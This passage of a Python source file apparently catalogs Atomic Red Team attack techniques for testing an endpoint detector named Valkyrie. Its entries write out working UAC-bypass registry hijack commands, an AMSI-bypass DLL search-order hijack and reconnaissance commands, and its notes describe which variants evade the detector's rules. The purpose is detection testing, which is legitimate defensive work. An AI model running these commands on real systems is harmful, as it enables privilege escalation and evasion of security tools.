    "third-party service - out of scope the same way a real C2 callout "
    "would be), disc-sandbox-check-thermal/disc-browser-bookmarks/disc-"
    "peripheral-pnp (thin value, deferred for a later pass, not because "
    "anything about them is unsafe). Every one of these is a real, "
    "verified candidate, just not converted to a live Technique() entry in "
    "this pass - a future pass can add them once the deferred prerequisite "
    "(a staged artifact, a sequencing decision, a live binary-presence "
    "check) is actually built, not guessed past."
)

EXPANSION_ROUND2B = [
    Technique(
        id="privesc-uac-eventvwr", technique_id="T1548.002",
        technique_name="Abuse Elevation Control Mechanism: Bypass UAC "
                        "(Event Viewer / mscfile hijack)",
        tactic="Privilege Escalation",
        art_test_ref="T1548.002 Test #1 (hijack HKCU mscfile\\shell\\open, "
                      "launch eventvwr.msc)",
        destructive=True, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: uac-bypass-hijack "
                       "(cmd_any includes 'mscfile\\shell')",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "reg.exe", "parent": "cmd.exe",
            "cmdline": r'reg.exe add hkcu\software\classes\mscfile\shell\open'
                       r'\command /ve /d "C:\Windows\System32\cmd.exe" /f',
            "path": ""},
        notes="Clean DETECT, correctly labeled - a DIFFERENT auto-elevate "
              "ProgId than the original catalog's fodhelper (ms-settings) "
              "entry, same generalized rule.",
    ),
    Technique(
        id="privesc-uac-sdclt", technique_id="T1548.002",
        technique_name="Abuse Elevation Control Mechanism: Bypass UAC "
                        "(sdclt DelegateExecute)",
        tactic="Privilege Escalation",
        art_test_ref="T1548.002 Test #7 (hijack HKCU Folder\\shell\\open, "
                      "launch sdclt.exe)",
        destructive=True, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: uac-bypass-hijack "
                       "(cmd_any includes '\\folder\\shell\\open\\command' "
                       "and 'delegateexecute')",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "powershell.exe", "parent": "cmd.exe",
            "cmdline": "powershell.exe New-Item -Force -Path "
                       "\"HKCU:\\Software\\Classes\\Folder\\shell\\open\\"
                       "command\" -Value 'cmd.exe /c notepad.exe'; "
                       "New-ItemProperty -Force -Path "
                       "\"HKCU:\\Software\\Classes\\Folder\\shell\\open\\"
                       "command\" -Name \"DelegateExecute\"",
            "path": ""},
        notes="Clean DETECT via the SAME generalized rule as eventvwr above "
              "- a third distinct auto-elevate ProgId (Folder, not "
              "mscfile/ms-settings) it already covers.",
    ),
    Technique(
        id="privesc-uac-wsreset", technique_id="T1548.002",
        technique_name="Abuse Elevation Control Mechanism: Bypass UAC "
                        "(WSReset AppX hijack)",
        tactic="Privilege Escalation",
        art_test_ref="T1548.002 Test #23 (hijack an AppX ProgId's "
                      "DelegateExecute, launch WSReset.exe)",
        destructive=True, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: uac-bypass-hijack "
                       "(cmd_any includes 'delegateexecute' - the only one "
                       "of its 5 keywords this specific ProgId string "
                       "matches, since the AppX class name itself is not in "
                       "the list)",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "powershell.exe", "parent": "cmd.exe",
            "cmdline": "powershell.exe New-ItemProperty -Path "
                       "HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5"
                       "ctqjf8msdd2\\Shell\\open\\command -Name "
                       "\"DelegateExecute\" -Value \"\" -Force",
            "path": ""},
        notes="ART's own text warns this specific bypass may not "
              "functionally escalate on Server 2022 - irrelevant to this "
              "test, which only measures whether the registry-write PATTERN "
              "is observed, not whether the exploit succeeds. Caught by the "
              "generic 'delegateexecute' keyword alone, since the AppX class "
              "GUID itself is not enumerable in advance.",
    ),
    Technique(
        id="privesc-uac-progids", technique_id="T1548.002",
        technique_name="Abuse Elevation Control Mechanism: Bypass UAC "
                        "(ProgID/CurVer hijack)",
        tactic="Privilege Escalation",
        art_test_ref="T1548.002 Test #27 (register a .pwn ProgId, redirect "
                      "ms-settings' CurVer to it, launch fodhelper.exe)",
        destructive=True, live_vm_safe=True, delivery=DELIVERY_NONE,
        detector_path="valkyrie/behavioral_rules.py: uac-bypass-hijack's "
                       "cmd_any list (ms-settings\\shell, mscfile\\shell, "
                       "exefile\\shell, \\folder\\shell\\open\\command, "
                       "delegateexecute) - NONE of these appear in a "
                       "CurVer redirect, which writes ms-settings\\CurVer "
                       "(no '\\shell' substring) and a separate .pwn "
                       "ProgId's own open command (no recognized ProgId "
                       "name at all)",
        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "reg.exe", "parent": "cmd.exe",
            "cmdline": r'reg add "HKEY_CURRENT_USER\Software\Classes\.pwn'
                       r'\Shell\Open\command" /ve /d '
                       r'"C:\Windows\System32\calc.exe" /f',
            "path": ""},
        notes="GENUINE GAP, same UAC-bypass family as three DETECTs above "
              "but a real generalization miss: this ProgID/CurVer redirect "
              "class (used by real malware, e.g. ValleyRAT) writes neither "
              "of the 5 substrings the existing rule keys on. Same launcher "
              "binary (fodhelper.exe) as the original catalog's covered "
              "entry, but the REGISTRY MECHANISM differs enough to evade "
              "entirely - a concrete, narrow rule-generalization candidate "
              "for the adversarial phase (e.g. also flag any HKCU write "
              "under Software\\Classes\\*\\Shell\\Open\\command combined "
              "with a CurVer redirect, not just the 5 hardcoded ProgIds).",
    ),
    Technique(
        id="privesc-dll-searchorder-amsi", technique_id="T1574.001",
        technique_name="Hijack Execution Flow: DLL Search Order Hijacking "
                        "(amsi.dll)",
        tactic="Privilege Escalation",
        art_test_ref="T1574.001 Test #1 (copy powershell.exe + amsi.dll to "
                      "%APPDATA%, run the renamed copy)",
        destructive=True, live_vm_safe=True, delivery=DELIVERY_NONE,
        detector_path="no rule found for DLL search-order hijacking; the "
                       "only T1574 entry is cor-profiler-hijack, a "
                       "different sub-technique (.012, COR_PROFILER env "
                       "var), keyed on unrelated strings",
        predicted_tier_b="MISS", source_confidence=SOURCE_PARTIAL,
        probe="ioa_rule", probe_input={
            # image is "cmd.exe", not "updater.exe": updater.exe is the
            # RENAMED COPY this command creates as its own first step, not a
            # pre-existing tool - the live harness pre-checks Get-Command on
            # this field before running, and Get-Command on a not-yet-created
            # file always fails, which silently and wrongly scored this
            # entry as tool-absent (not_executed_no_command) on every real
            # run instead of actually attempting it. Found 2026-08-27.
            "image": "cmd.exe", "parent": "cmd.exe",
            "cmdline": r"copy %windir%\System32\windowspowershell\v1.0"
                       r"\powershell.exe %APPDATA%\updater.exe & "
                       r"copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll "
                       r"& %APPDATA%\updater.exe -Command exit",
            "path": r"C:\Users\Public\AppData\Roaming\updater.exe"},
        notes="Real PowerShell engine renamed + a co-located amsi.dll "
              "planted next to it is a textbook AMSI-bypass-via-hijack "
              "setup. Nothing in behavioral_rules.py targets this pattern "
              "today. SOURCE_PARTIAL: only grepped, not exhaustively "
              "traced across every classifier file.",
    ),
    Technique(
        id="disc-net-connections-ps", technique_id="T1049",
        technique_name="System Network Connections Discovery (PowerShell)",
        tactic="Discovery",
        art_test_ref="T1049 Test #2 (Get-NetTCPConnection)",
        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/process_telemetry.py classify_discovery "
                       "(new 'get-nettcpconnection' branch, added 2026-08-27) "
                       "-> 'reconnaissance-burst' sequence IOA (T1049 already "
                       "in the sequence's technique tuple)",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="recon_burst", probe_input={
            "image": "powershell.exe", "cmdline": "powershell.exe Get-NetTCPConnection",
            "co_occurring": [("systeminfo.exe", "systeminfo.exe"),
                             ("tasklist.exe", "tasklist.exe /v")]},
        notes="CLOSED 2026-08-27: was a confirmed generalization gap (the "
              "binary form, netstat.exe, was covered; the PowerShell-cmdlet "
              "form was not). classify_discovery now recognizes "
              "Get-NetTCPConnection unconditionally (no same-name mutating "
              "form exists to exclude). Like disc-localgroup, this alone "
              "raises nothing by design - probe='recon_burst' replays it "
              "with the same proven co-occurring partners and confirms the "
              "burst completes. Offline-verified via replay_harness.py; "
              "live Tier B re-verification pending (this project counts "
              "only a real run as proof).",
    ),
    Technique(
        id="disc-service-net-start", technique_id="T1007",
        technique_name="System Service Discovery (net start)",
        tactic="Discovery",
        art_test_ref="T1007 Test #2 (net.exe start)",
        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/process_telemetry.py classify_discovery "
                       "(new net.exe bare-'start' branch, added 2026-08-27: "
                       "'start' with nothing after it lists services, 'start "
                       "<svc>' would start one - the same verb-then-argument "
                       "shape net.exe itself uses to distinguish them) -> "
                       "'reconnaissance-burst' sequence IOA (T1007 already "
                       "in the technique tuple)",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="recon_burst", probe_input={
            "image": "net.exe", "cmdline": "net.exe start",
            "co_occurring": [("systeminfo.exe", "systeminfo.exe"),
                             ("tasklist.exe", "tasklist.exe /v")]},
        notes="CLOSED 2026-08-27: net.exe was already recognized for 4 other "
              "verbs; bare 'start' fell through unclassified. Offline-"
              "verified via replay_harness.py; live Tier B re-verification "
              "pending.",
    ),
    Technique(
        id="disc-service-discovery-ps", technique_id="T1007",
        technique_name="System Service Discovery (PowerShell)",
        tactic="Discovery",
        art_test_ref="T1007 Test #4 (Get-Service)",
        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/process_telemetry.py classify_discovery "
                       "(new 'get-service' branch, added 2026-08-27) -> "
                       "'reconnaissance-burst' sequence IOA (T1007 already "
                       "in the technique tuple)",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="recon_burst", probe_input={
            "image": "powershell.exe", "cmdline": "powershell.exe Get-Service",
            "co_occurring": [("systeminfo.exe", "systeminfo.exe"),
                             ("tasklist.exe", "tasklist.exe /v")]},
        notes="CLOSED 2026-08-27, same generalization-gap class as "
              "disc-net-connections-ps. Get-Service is unconditionally "
              "read-only for this purpose (Set-Service/Start-Service/"
              "Stop-Service are separate cmdlet names, so the substring "
              "match cannot collide with a mutating one). Offline-verified "
              "via replay_harness.py; live Tier B re-verification pending.",
    ),
    Technique(
        id="disc-scheduled-tasks-query", technique_id="T1007",
        technique_name="System Service Discovery (scheduled task "
                        "enumeration)",
        tactic="Discovery",
        art_test_ref="T1007 Test #6 (schtasks /query /fo LIST /v)",
        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/process_telemetry.py classify_discovery "
                       "(new schtasks.exe branch, added 2026-08-27, mirroring "
                       "the existing reg.exe/sc.exe 'query verb, not a "
                       "mutating one' pattern) -> 'reconnaissance-burst' "
                       "sequence IOA (T1007 already in the technique tuple)",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="recon_burst", probe_input={
            "image": "schtasks.exe", "cmdline": "schtasks.exe /query /fo LIST /v",
            "co_occurring": [("systeminfo.exe", "systeminfo.exe"),
                             ("tasklist.exe", "tasklist.exe /v")]},
        notes="CLOSED 2026-08-27: schtasks.exe was not a recognized binary "
              "in any discovery branch at all (distinct from the covered "
              "T1053.005 entry, which tests task CREATION via a different "
              "mechanism/probe). Read-only /query is now excluded from "
              "create/delete/change/run/end, the same shape as reg.exe/"
              "sc.exe's own query-vs-mutating check. Offline-verified via "
              "replay_harness.py; live Tier B re-verification pending.",
    ),
    Technique(
        id="disc-network-shares-smb", technique_id="T1135",
        technique_name="Network Share Discovery (Get-SmbShare)",
        tactic="Discovery",
        art_test_ref="T1135 Test #5 (Get-SmbShare)",
        destructive=False, live_vm_safe=True, delivery=DELIVERY_NONE,
        detector_path="no cmdlet-path branch recognizes Get-SmbShare "
                       "(distinct from the covered net.exe 'view' entry, "
                       "which known_mismatches to T1018 anyway)",
        predicted_tier_b="MISS", source_confidence=SOURCE_PARTIAL,
        probe="ioa_rule", probe_input={
            "image": "powershell.exe", "parent": "cmd.exe",
            "cmdline": "powershell.exe Get-SmbShare", "path": ""},
        notes="Same generalization gap class - the cmdlet form of an "
              "already-tested binary technique is invisible.",
    ),
    Technique(
        id="disc-security-software-cim", technique_id="T1518.001",
        technique_name="Security Software Discovery (CIM/WMI antivirus "
                        "query)",
        tactic="Discovery",
        art_test_ref="T1518.001 Test #8 (Get-CimInstance "
                      "root/securityCenter2 antivirusproduct)",
        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/process_telemetry.py classify_discovery "
                       "(new 'get-ciminstance' + securitycenter2/"
                       "antivirusproduct branch, added 2026-08-27 - "
                       "Get-CimInstance alone is too common to match "
                       "unconditionally) -> 'reconnaissance-burst' sequence "
                       "IOA (T1518 added to the technique tuple 2026-08-27; "
                       "T1518.001 matches via the tuple's own "
                       "startswith(t+'.') prefix rule)",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="recon_burst", probe_input={
            "image": "powershell.exe",
            "cmdline": "powershell.exe Get-CimInstance -Namespace "
                       "root/securityCenter2 -ClassName antivirusproduct",
            "co_occurring": [("systeminfo.exe", "systeminfo.exe"),
                             ("tasklist.exe", "tasklist.exe /v")]},
        notes="CLOSED 2026-08-27: this directly probes for Valkyrie's own "
              "presence via a WMI-namespace query neither this nor the "
              "already-covered netsh/tasklist T1518.001 entry could see "
              "before. Scoped to the specific antivirus-fingerprinting "
              "namespace/class, not bare Get-CimInstance (which is routine "
              "admin scripting). Offline-verified via replay_harness.py; "
              "live Tier B re-verification pending.",
    ),
    Technique(
        id="disc-software-installed", technique_id="T1518",
        technique_name="Software Discovery",
        tactic="Discovery",
        art_test_ref="T1518 Test #2 (enumerate installed software via the "
                      "Uninstall registry key)",
        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/process_telemetry.py classify_discovery "
                       "(new 'get-itemproperty'/'get-item' + 'uninstall' "
                       "branch, added 2026-08-27) -> 'reconnaissance-burst' "
                       "sequence IOA (T1518 added to the technique tuple "
                       "2026-08-27)",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="recon_burst", probe_input={
            "image": "powershell.exe",
            "cmdline": "powershell.exe Get-ItemProperty "
                       "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion"
                       "\\Uninstall\\*",
            "co_occurring": [("systeminfo.exe", "systeminfo.exe"),
                             ("tasklist.exe", "tasklist.exe /v")]},
        notes="CLOSED 2026-08-27: FIRST T1518 entry in the catalog (parent "
              "technique of the already-covered T1518.001 sub-technique). "
              "Deliberately labeled T1518 (Software Discovery), not the "
              "generic T1012 (Query Registry) reg.exe's own branch already "
              "covers - crediting this under T1012 would be a different "
              "ATT&CK id than the one actually under test, the same "
              "wrong-label trap disc-domain-groups and disc-localgroup hit "
              "earlier. Scoped to the Uninstall key specifically, mirroring "
              "how 'net localgroup' earns its own T1069.001 distinct from "
              "bare 'net user's T1087.001. Offline-verified via "
              "replay_harness.py; live Tier B re-verification pending.",
    ),
    Technique(
        id="disc-password-policy", technique_id="T1201",
        technique_name="Password Policy Discovery",
        tactic="Discovery",
        art_test_ref="T1201 Test #6 (net accounts)",
        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/process_telemetry.py classify_discovery "
                       "(new net.exe bare-'accounts' branch, added "
                       "2026-08-27: same verb-then-argument shape as "
                       "'start' above - bare 'accounts' displays policy, "
                       "'accounts /minpwlen:N' sets it) -> "
                       "'reconnaissance-burst' sequence IOA (T1201 added to "
                       "the technique tuple 2026-08-27)",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="recon_burst", probe_input={
            "image": "net.exe", "cmdline": "net.exe accounts",
            "co_occurring": [("systeminfo.exe", "systeminfo.exe"),
                             ("tasklist.exe", "tasklist.exe /v")]},
        notes="CLOSED 2026-08-27: FIRST T1201 entry in the catalog. Same "
              "net.exe binary already recognized for 4 other verbs; "
              "'accounts' was a 5th gap in the same branch. Offline-"
              "verified via replay_harness.py; live Tier B re-verification "
              "pending.",
    ),
    Technique(
        id="disc-domain-groups", technique_id="T1069.002",
        technique_name="Permission Groups Discovery: Domain Groups",
        tactic="Discovery",
        art_test_ref="T1069.002 Test #1 (net group \"domain admins\" "
                      "/domain)",
        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
        detector_path="process_telemetry.py's net.exe branch: 'net group' "
                       "(without /add) now returns T1069.002 directly - fixed "
                       "2026-08-31, same bug class as the earlier T1069.001 "
                       "'net localgroup' fix",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="recon_burst", probe_input={
            "image": "net.exe",
            "cmdline": 'net group "domain admins" /domain',
            "co_occurring": [("systeminfo.exe", "systeminfo.exe"),
                             ("tasklist.exe", "tasklist.exe /v")]},
        notes="FIXED 2026-08-31: 'net group' is MITRE's own documented "
              "example for T1069.002 (domain GROUP membership, e.g. 'Domain "
              "Admins'), but the code's net.exe branch returned T1087.002 "
              "(domain ACCOUNT discovery) for any non-/add 'net group' "
              "invocation - there was no dedicated domain-GROUPS discovery "
              "label anywhere. Unlike the deferred fix this note used to "
              "describe, no group-argument disambiguation turned out to be "
              "needed: 'net group' itself (bare, or with a specific group "
              "name) is ALWAYS about groups, never accounts, so the branch's "
              "return value was simply wrong for every case, not just some. "
              "CORRECTED cmdline note (unchanged from the prior finding): the "
              "check is a literal two-word substring match on 'net group' "
              "(unlike the single-word 'view' check that covers the T1018 "
              "branch), so 'net.exe group ...' does not match at all - only "
              "the bare 'net group ...' form does, which is also the exact "
              "form ART's own atomic uses. Offline-verified via "
              "test_process_telemetry.py's new T1069.002 cases; live Tier B "
              "re-verification pending - expect this to fire as T1069.002 "
              "directly (known_mismatch removed) on the next live run.",
    ),
    Technique(
        id="disc-file-dir-ps", technique_id="T1083",
        technique_name="File and Directory Discovery (PowerShell)",
        tactic="Discovery",
        art_test_ref="T1083 Test #2 (Get-ChildItem -Recurse, scoped to "
                      "$env:USERPROFILE rather than ART's default full-drive "
                      "form)",
        destructive=False, live_vm_safe=True, delivery=DELIVERY_NONE,
        detector_path="no cmdlet-path branch recognizes Get-ChildItem "
                       "(distinct from the covered cmd.exe 'dir' entry, "
                       "which is also an honest MISS for the same reason: "
                       "no cmd.exe-builtin branch exists either)",
        predicted_tier_b="MISS", source_confidence=SOURCE_PARTIAL,
        probe="ioa_rule", probe_input={
            "image": "powershell.exe", "parent": "cmd.exe",
            "cmdline": "powershell.exe Get-ChildItem -Path $env:USERPROFILE "
                       "-Recurse -ErrorAction SilentlyContinue",
            "path": ""},
        notes="Bounded to the user profile rather than ART's full C:\\ "
              "recursive scan, which would be needlessly slow/IO-heavy on "
              "a CI runner for no additional detection signal.",
    ),
]

# ---------------------------------------------------------------------------
# Round 2 techniques researched but explicitly excluded, named and reasoned
# rather than silently dropped, matching this file's OUT_OF_SCOPE philosophy.
# These are NOT added to OUT_OF_SCOPE (which the exporter always includes,
# unlike this comment) because they were never real Technique() candidates to
# begin with - they failed the sourcing bar itself, not a safety review of an
# otherwise-valid entry.
#
#   T1552.006 (GPP cpassword)      - ART's only test requires a domain-joined
#                                     host reading its own SYSVOL; no
#                                     standalone-VM-safe variant exists.
#   T1567.002 (Exfil to cloud)     - ART's test uses rclone against a REAL,
#                                     shared, publicly-documented Mega.nz
#                                     account with hardcoded credentials in
#                                     the public ART repo. Actually exfiltrating
#                                     to a third party's live account (whose
#                                     credentials may be dead, rotated, or
#                                     ToS-relevant) is not something this
#                                     catalog will do; no safe local substitute
#                                     was invented in its place, since a
#                                     fabricated substitute is exactly what
#                                     this expansion was told never to do.
#   T1134.001 (Named-pipe impersonation) - ART's only test downloads and
#                                     executes a real Empire C2 framework
#                                     module from GitHub at runtime. Meaningfully
#                                     different in kind from every other atomic
#                                     in this catalog (a literal native command);
#                                     excluded rather than run an actual C2
#                                     tool component against the evaluation host.
#   T1113 (Screen Capture)         - the only ART tests that are Windows-
#                                     native (#7 psr.exe, #8 CopyFromScreen)
#                                     were not source-traced against Valkyrie's
#                                     classifiers in this pass; deferred rather
#                                     than catalogued on a guess.
# =============================================================================

ALL_TACTICS = {
    "Execution": EXECUTION,
    "Persistence": PERSISTENCE,
    "Defense Evasion": DEFENSE_EVASION,
    "Credential Access": CREDENTIAL_ACCESS,
    "Discovery": DISCOVERY,
    "Lateral Movement": LATERAL_MOVEMENT,
    "Command and Control": COMMAND_AND_CONTROL,
    "Impact": IMPACT,
    "Extended (behavioral rules)": EXTENDED,
    "Breadth expansion 2026-08": BREADTH_EXPANSION,
    "Breadth expansion round 2 (2026-08-26)": EXPANSION_ROUND2,
    "Breadth expansion round 2B (2026-08-26)": EXPANSION_ROUND2B,
}


def all_in_scope() -> list[Technique]:
    out: list[Technique] = []
    for techs in ALL_TACTICS.values():
        out.extend(t for t in techs if t.in_scope())
    return out


def all_including_out_of_scope() -> list[Technique]:
    out: list[Technique] = []
    for techs in ALL_TACTICS.values():
        out.extend(techs)
    out.extend(OUT_OF_SCOPE)
    return out


def export_json(path: str) -> None:
    """Dump the in-scope catalog to JSON -- the ONE source of truth both
    replay_harness.py (Python) and run_live_evaluation.ps1 (PowerShell) read
    from, so the 40 technique definitions are never hand-duplicated in two
    languages and cannot drift out of sync between tiers."""
    import json
    data = {"catalog_version": CATALOG_VERSION,
           "techniques": [t.as_dict() for t in all_in_scope()],
           "out_of_scope": [t.as_dict() for t in OUT_OF_SCOPE]}
    Path(path).write_text(json.dumps(data, indent=2), encoding="utf-8")
    print(f"Exported {len(data['techniques'])} techniques to {path}")


if __name__ == "__main__":
    if len(sys.argv) > 2 and sys.argv[1] == "--export":
        export_json(sys.argv[2])
    else:
        in_scope = all_in_scope()
        print(f"Catalog version {CATALOG_VERSION}")
        print(f"{len(in_scope)} in-scope techniques across {len(ALL_TACTICS)} tactics")
        print(f"{len(OUT_OF_SCOPE)} explicitly out-of-scope (reasons given)")
        for tactic, techs in ALL_TACTICS.items():
            print(f"  {tactic:<22} {len(techs)}")
